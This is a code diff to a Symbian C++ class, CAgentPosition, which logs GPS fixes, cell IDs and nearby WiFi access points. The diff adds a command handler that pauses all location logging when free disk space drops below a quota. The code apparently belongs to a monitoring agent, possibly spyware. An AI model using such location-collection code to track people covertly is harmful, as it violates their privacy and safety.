@@ -337,6 +337,30 @@ void CAgentPosition::StopAgentCmdL()
 		iLogGps->CloseLogL();
 	}
 
+void CAgentPosition::NotifyAgentCmdL(TUint32 aData)
+	{
+	TInt notifyType = aData & 0x000000ff;
+	switch(notifyType)
+		{
+		case ENotifyThreshold:
+			{
+			TInt value = (aData & 0x0000ff00) >> 8;
+			if (value == EBelow)
+				{
+				iBelowFreespaceQuota = ETrue;
+				}
+			else
+				{
+				iBelowFreespaceQuota = EFalse;
+				}
+			}
+			break;
+		default:
+			break;
+		}
+	}
+
+
 HBufC8* CAgentPosition::GetCellIdBufferL()
 	{
 	TUint cellId=0;
@@ -488,7 +512,7 @@ HBufC8* CAgentPosition::GetWiFiBufferL(TLocationAdditionalData* additionalData)
 		for(TInt k = 0; k < bssid.Length(); k++)
 			wifiInfo.macAddress[k] = bssid[k];
 		
-		//Retrieve transmision level
+		//Retrieve transmission level
 		TInt8 rxLevel = scanInfo->RXLevel();
 		wifiInfo.rssi = rxLevel;
 		
@@ -537,7 +561,10 @@ void CAgentPosition::HandleGPSPositionL(TPositionSatelliteInfo position)
 		buf.CleanupClosePushL();
 		if (buf.Length() > 0)
 			{
-			iLogGps->AppendLogL(buf);
+			if(!iBelowFreespaceQuota)
+				{
+				iLogGps->AppendLogL(buf);
+				}
 			}
 		CleanupStack::PopAndDestroy(&buf);
 		}
@@ -574,7 +601,10 @@ void CAgentPosition::TimerExpiredL(TAny* src)
 			// Log CELL ID to file...
 			RBuf8 buf(GetCellIdBufferL());
 			buf.CleanupClosePushL();
-			iLogCell->AppendLogL(buf);
+			if(!iBelowFreespaceQuota)
+				{
+				iLogCell->AppendLogL(buf);
+				}
 			CleanupStack::PopAndDestroy(&buf);
 			}
 	
@@ -587,11 +617,14 @@ void CAgentPosition::TimerExpiredL(TAny* src)
 			buf.CleanupClosePushL();
 			if (buf.Length() > 0)
 				{
-				CLogFile* logFile = CLogFile::NewLC(iFs);
-				logFile->CreateLogL(LOGTYPE_LOCATION_NEW, &additionalData);
-				logFile->AppendLogL(buf);
-				logFile->CloseLogL();
-				CleanupStack::PopAndDestroy(logFile);
+				if(!iBelowFreespaceQuota)
+					{
+					CLogFile* logFile = CLogFile::NewLC(iFs);
+					logFile->CreateLogL(LOGTYPE_LOCATION_NEW, &additionalData);
+					logFile->AppendLogL(buf);
+					logFile->CloseLogL();
+					CleanupStack::PopAndDestroy(logFile);
+					}
 				}
 			CleanupStack::PopAndDestroy(&buf);
 			}
